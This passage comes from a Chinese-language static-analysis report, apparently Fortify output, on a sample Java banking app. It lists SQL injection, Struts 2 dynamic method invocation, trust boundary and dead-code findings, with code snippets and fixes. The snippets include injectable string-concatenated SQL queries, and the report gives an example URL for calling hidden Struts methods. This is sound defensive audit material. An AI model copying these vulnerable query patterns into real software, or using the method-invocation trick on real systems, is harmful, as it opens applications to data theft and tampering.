	ResultSet results = stmt.execute();
...


下面是 Android 的等同内容：


...
	PasswordAuthentication pa = authenticator.getPasswordAuthentication();
	String userName = pa.getUserName();
	String itemName = this.getIntent().getExtras().getString("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
	Cursor c = db.rawQuery(query, new Object[]{itemName, userName});
...


更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 使用参数化 SQL 指令的一个常见错误是使用由用户控制的字符串来构造 SQL 指令。这显然背离了使用参数化 SQL 指令的初衷。如果不能确定用来构造参数化指令的字符串是否由应用程序控制，请不要因为它们不会直接作为 SQL 指令执行，就假定它们是安全的。务必彻底地检查 SQL 指令中使用的所有由用户控制的字符串，确保它们不会修改查询的含意。

2. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="67DA38DDCF36CC57028C5694BF0DDB2F" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 LocationService.java 的第 139 行，findAtmByAddress() 方法调用通过不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>139</LineStart>
                                <Snippet>            String queryStr = "SELECT * FROM location WHERE branch = 'Yes' AND state = '" + state + "' AND city = '" + city + "' AND address = '" + address + "'";
            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery(queryStr);
            while (rs.next())
            {</Snippet>
                                <TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>FindLocations.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/FindLocations.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>	}

	public void setCity(String city)
	{
		this.city = city;</Snippet>
                                <TargetFunction>setCity(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="93455FEE6DA6F8A692A885BBC8D33610" ruleID="5870A527-08AF-452C-84B2-7F6C360CA7EF">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 LocationService.java 的第 110 行，findByZip() 方法调用通过不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>110</LineStart>
                                <Snippet>
            String queryStr = "SELECT * FROM location WHERE zip = '" + zip  + "'";
            statement = conn.prepareStatement(queryStr);
            ResultSet rs = statement.executeQuery();
            while (rs.next())</Snippet>
                                <TargetFunction>java.sql.Connection.prepareStatement()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>FindLocations.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/FindLocations.java</FilePath>
                                <LineStart>91</LineStart>
                                <Snippet>	}

	public void setZip(String zip)
	{
		this.zip = zip;</Snippet>
                                <TargetFunction>setZip(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="37FA7646DEC2AEE2A44BC3E9526732C0" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 LocationService.java 的第 139 行，findAtmByAddress() 方法调用通过不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>139</LineStart>
                                <Snippet>            String queryStr = "SELECT * FROM location WHERE branch = 'Yes' AND state = '" + state + "' AND city = '" + city + "' AND address = '" + address + "'";
            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery(queryStr);
            while (rs.next())
            {</Snippet>
                                <TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>FindLocations.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/FindLocations.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>	}

	public void setAddress(String address)
	{
		this.address = address;</Snippet>
                                <TargetFunction>setAddress(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="063A6F4E57B2A8AC011999C76CA5DB28" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 LocationService.java 的第 139 行，findAtmByAddress() 方法调用通过不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>139</LineStart>
                                <Snippet>            String queryStr = "SELECT * FROM location WHERE branch = 'Yes' AND state = '" + state + "' AND city = '" + city + "' AND address = '" + address + "'";
            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery(queryStr);
            while (rs.next())
            {</Snippet>
                                <TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>FindLocations.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/FindLocations.java</FilePath>
                                <LineStart>81</LineStart>
                                <Snippet>	}

	public void setState(String state)
	{
		this.state = state;</Snippet>
                                <TargetFunction>setState(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="33CE7726847CB5E469F26DDEF4B5896F" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 AdminUtil.java 的第 90 行，debugAdminRoles() 方法调用可能使用不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>90</LineStart>
                                <Snippet>		    int roleid = ((Integer)roles.get(index)).intValue();

            rs = statement.executeQuery("SELECT rolename FROM auth WHERE roleid = " + roleid);
            rs.next();
</Snippet>
                                <TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Struts 2 Bad Practices: Dynamic Method Invocation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Struts 2 Action com.fortify.samples.riches.oper.SendMessage 暴露了可由最终用户调用的公共方法 getMailCommand，从而覆盖 Action 的 execute() 方法。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Struts 2 引入了一种称为“动态方法调用”的功能，该功能允许 Action 暴露方法而非 execute()。!（感叹号）字符或 method: 前缀可用于 Action URL，在启用“动态方法调用”的情况下，可调用 Action 中的任何公共方法。没有意识到此功能的开发者可能会无意中将内部业务逻辑暴露给攻击者。

例如，如果 Action 包含一种称为 getUserPassword() 的公共方法，该方法没有采用参数且未禁用“动态方法调用”功能，则攻击者可以利用这点访问以下 URL： http://server/app/recoverpassword!getPassword.action
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>Struts 2.3.1.1 之后，引入了一种新的配置属性禁用“动态方法调用”功能。为了禁用此功能，请使用 struts.enable.DynamicMethodInvocation 属性作为 Struts 2 属性设置：


  &lt;constant name="struts.enable.DynamicMethodInvocation" value="false" /&gt;


或在 struts.properties 中：


  struts.enable.DynamicMethodInvocation = false


或在 web.xml 的 Struts 2 过滤器中包含此参数节点：


  &lt;init-param&gt;
    &lt;param-name&gt;struts.enable.DynamicMethodInvocation&lt;/param-name&gt;
    &lt;param-value&gt;false&lt;/param-value&gt;
  &lt;/init-param&gt;


</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 在 Struts 2.3.15.2 中，Dynamic Method Invocation 属性默认设置为 false。如果使用 Struts 2.3.15.2 或更高版本且未明确启用 Dynamic Method Invocation，请忽视此问题。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="15FDCE6E34C0552288194C75D0AD6E82" ruleID="C0361CD2-AC7B-4C2D-9C40-2F9B36743671">
                            <Category>Struts 2 Bad Practices: Dynamic Method Invocation</Category>
                            <Folder>High</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 2 Action com.fortify.samples.riches.oper.SendNewsletter 暴露了可由最终用户调用的公共方法 getMailCommand，从而覆盖 Action 的 execute() 方法。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendNewsletter.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendNewsletter.java</FilePath>
                                <LineStart>27</LineStart>
                                <Snippet>    }

    public String[] getMailCommand()
    {
        String java;</Snippet>
                                <TargetFunction>Function: getMailCommand()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3CCC019594299E08DA2788FCBBF52BDF" ruleID="C0361CD2-AC7B-4C2D-9C40-2F9B36743671">
                            <Category>Struts 2 Bad Practices: Dynamic Method Invocation</Category>
                            <Folder>High</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 2 Action com.fortify.samples.riches.PerformCheck 暴露了可由最终用户调用的公共方法 printUsers，从而覆盖 Action 的 execute() 方法。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformCheck.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformCheck.java</FilePath>
                                <LineStart>59</LineStart>
                                <Snippet>    }

   public void printUsers() {
	try {
        	for (Object email : ProfileService.getAllEmail()) {</Snippet>
                                <TargetFunction>Function: printUsers()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="394BB39AED65EC2624E279C70E4C4CD4" ruleID="C0361CD2-AC7B-4C2D-9C40-2F9B36743671">
                            <Category>Struts 2 Bad Practices: Dynamic Method Invocation</Category>
                            <Folder>High</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 2 Action com.fortify.samples.riches.PerformRegistration 暴露了可由最终用户调用的公共方法 getNewCCN，从而覆盖 Action 的 execute() 方法。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformRegistration.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformRegistration.java</FilePath>
                                <LineStart>112</LineStart>
                                <Snippet>	}

	public static String getNewCCN() {

		String ccnumber="";</Snippet>
                                <TargetFunction>Function: getNewCCN()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="96F7D9ADD9ABD5E97E9CF49788AFC2FE" ruleID="C0361CD2-AC7B-4C2D-9C40-2F9B36743671">
                            <Category>Struts 2 Bad Practices: Dynamic Method Invocation</Category>
                            <Folder>High</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 2 Action com.fortify.samples.riches.PerformRegistration 暴露了可由最终用户调用的公共方法 getNewAcctno，从而覆盖 Action 的 execute() 方法。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformRegistration.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformRegistration.java</FilePath>
                                <LineStart>100</LineStart>
                                <Snippet>    }

	public static String getNewAcctno() {

		String account="";</Snippet>
                                <TargetFunction>Function: getNewAcctno()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="93C41E38E8F030FFBCB5695B8F2265CA" ruleID="C0361CD2-AC7B-4C2D-9C40-2F9B36743671">
                            <Category>Struts 2 Bad Practices: Dynamic Method Invocation</Category>
                            <Folder>High</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 2 Action com.fortify.samples.riches.oper.SendMessage 暴露了可由最终用户调用的公共方法 getMailCommand，从而覆盖 Action 的 execute() 方法。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>40</LineStart>
                                <Snippet>    }

    public String[] getMailCommand()
    {
        String java;</Snippet>
                                <TargetFunction>Function: getMailCommand()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>ViewMessage.jsp 中的 _jspService() 方法将可信赖的数据和不可信赖的数据混合在同一数据结构中，这会导致程序员错误地信任未经验证的数据。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>信任边界可以理解为在程序中划分的分界线。分界线的一边是不可信赖的数据。分界线的另一边则是被认定为是可信赖的数据。验证逻辑的用途是允许数据安全地跨越信任边界 — 从不可信赖的一边移动到可信赖的另一边。

当程序使可信赖和不可信赖的分界线模糊不清时，就会发生 Trust Boundary Violation 漏洞。发生这种错误的最普遍方式是允许可信赖的数据和不可信赖的数据共同混合在同一数据结构中。



示例：以下 Java 代码接受了一个 HTTP 请求。在 HTTP 会话对象中存储了 usrname 参数以后，再进行检查，以确保该用户已经过了验证。


usrname = request.getParameter("usrname");
if (session.getAttribute(ATTR_USR) != null) {
    session.setAttribute(ATTR_USR, usrname);
}


若不对信任边界进行合理构建及良好维护，则程序员不可避免地会混淆哪些数据已经过验证，哪些尚未经过验证。这种混淆最终会导致某些数据未经验证就加以使用了。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>在应用程序中定义信任边界。不要在数据结构中储存在某些环境下受信任而在其他环境下又转而不可信赖的数据。应尽量减少数据跨越信任边界的方式。

在处理输入之前，需要通过一系列用户交互来累积输入时，有时就会出现 Trust Boundary Violation 漏洞。所以，在得出所有数据之前，不可能进行完整的输入验证。在这种情况下，维护信任边界仍然是非常重要的。应将不可信赖的数据添加到一个不受信任数据结构中，待验证后，再移至可信赖的区域。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 您不必费力地寻找“确凿的证据”，来证明某些未经验证的数据被假定为可信赖的数据。如果没有明确地描绘出信任边界并对其加以信赖，则发生验证错误在所难免。所以，与其花费时间寻找一个可利用的方法，还不如集中精力指导编程人员创建良好的信任边界。

2. 大多数程序都有一个通过应用程序语义定义的信任边界。可考虑编写自定义规则，以检查其他存在跨信任边界的用户输入的地方。

3. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="41CCE3C341E6D9A37BA7359D123B7FE2" ruleID="1B6BC14D-3195-4E97-91CC-A0DE198B3D7D">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法将可信赖的数据和不可信赖的数据混合在同一数据结构中，这会导致程序员错误地信任未经验证的数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>8</LineStart>
                                <Snippet>
   Message msg = (Message)(MessageService.getMessage(decodedParameter).get(0));
   pageContext.setAttribute("severity", msg.getSeverity());
   pageContext.setAttribute("sender", msg.getSender());
   pageContext.setAttribute("subject", msg.getSubject());</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspContext.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="54F07D2F86D7D53901D197E662D5AA78" ruleID="1B6BC14D-3195-4E97-91CC-A0DE198B3D7D">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法将可信赖的数据和不可信赖的数据混合在同一数据结构中，这会导致程序员错误地信任未经验证的数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>10</LineStart>
                                <Snippet>   pageContext.setAttribute("severity", msg.getSeverity());
   pageContext.setAttribute("sender", msg.getSender());
   pageContext.setAttribute("subject", msg.getSubject());
   pageContext.setAttribute("body", msg.getBody());
%&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspContext.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="291FD00848DFB29893509E37463EEAF3" ruleID="1B6BC14D-3195-4E97-91CC-A0DE198B3D7D">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法将可信赖的数据和不可信赖的数据混合在同一数据结构中，这会导致程序员错误地信任未经验证的数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>11</LineStart>
                                <Snippet>   pageContext.setAttribute("sender", msg.getSender());
   pageContext.setAttribute("subject", msg.getSubject());
   pageContext.setAttribute("body", msg.getBody());
%&gt;
</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspContext.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BBD86335322CFFCB6CA0DB1733595B19" ruleID="1B6BC14D-3195-4E97-91CC-A0DE198B3D7D">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法将可信赖的数据和不可信赖的数据混合在同一数据结构中，这会导致程序员错误地信任未经验证的数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>   Message msg = (Message)(MessageService.getMessage(decodedParameter).get(0));
   pageContext.setAttribute("severity", msg.getSeverity());
   pageContext.setAttribute("sender", msg.getSender());
   pageContext.setAttribute("subject", msg.getSubject());
   pageContext.setAttribute("body", msg.getBody()); </Snippet>
                                <TargetFunction>javax.servlet.jsp.JspContext.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>ConnectionFactory.java 中的方法 DebugSession() 不能从该类以外的任何方法中获得。它是一个 dead code。Dead code 是指从未以公共方法直接或间接执行的代码。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>不会调用这个方法，或者仅仅通过其他 dead code 进行调用。

例 1：在下面这个类中，doWork() 方法将永远不会被调用。


public class Dead {
  private void doWork() {
    System.out.println("doing work");
  }
  public static void main(String[] args) {
    System.out.println("running Dead");
  }
}


例 2： 在下面这个类中，虽然两个私有方法相互调用，但是因为它们中的任何一个都不会在其他地方调用，所以最终还是 dead code。


public class DoubleDead {
  private void doTweedledee() {
    doTweedledumb();
  }
  private void doTweedledumb() {
    doTweedledee();
  }
  public static void main(String[] args) {
    System.out.println("running DoubleDead");
  }
}


（在这里，我们应该庆幸没有使用这两种方法：调用其中任何一种方法都会导致死循环。）</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>无用方法有可能指出调度代码中的 bug 所在。

例 3：如果类中一个名为 getWitch() 的方法被标记为死方法，同时这个类还包含以下调度方法，那么这可能是由于复制粘帖错误而引起的。“w”应返回 getWitch() 而不是 getMummy()。


public ScaryThing getScaryThing(char st) {
  switch(st) {
    case 'm':
      return getMummy();
    case 'w':
      return getMummy();
    default:
      return getBlob();
  }
}


总之，您应该去修改或是删除 dead code。要修复 dead code，请通过公共方法直接或间接执行此 dead code。Dead code 不仅不能实现任何程序功能，还会带来额外的麻烦和维护负担。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 如果程序使用反射访问私有方法，会导致这个问题发生误报。（这并非标准方法。如果私有方法仅仅通过反射来调用，那么应该对这些方法进行详细说明。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="45229760D86990231A2F37D47E2C3437" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>MessageService.java 中的方法 debugMessages() 不能从该类以外的任何方法中获得。它是一个 dead code。Dead code 是指从未以公共方法直接或间接执行的代码。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>111</LineStart>
                                <Snippet>	}

	private static void debugMessages(List messages) throws Exception
	{
		Logger debugLogger = Logger.getLogger(MessageService.class.getName());</Snippet>
                                <TargetFunction>Function: debugMessages()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2C0DF5A3B3F6BD73D02CA293D5938B80" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XMLUtil.java 中的方法 validateAccountXML() 不能从该类以外的任何方法中获得。它是一个 dead code。Dead code 是指从未以公共方法直接或间接执行的代码。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>45</LineStart>
                                <Snippet>    }

    private static boolean validateAccountXML(Document doc)
    {
        NodeList nodeList = null;</Snippet>
                                <TargetFunction>Function: validateAccountXML()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8B5793887EA222804E31DA0B9A453360" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ConnectionFactory.java 中的方法 DebugSession() 不能从该类以外的任何方法中获得。它是一个 dead code。Dead code 是指从未以公共方法直接或间接执行的代码。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>134</LineStart>
                                <Snippet>	}

    private boolean DebugSession()
    {
        //some debug code for the session</Snippet>
                                <TargetFunction>Function: DebugSession()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Denial of Service</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>调用 Backup.jsp 中第 11 行的 readLine() 可能会使攻击者造成程序崩溃或让合法用户无法进行使用。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
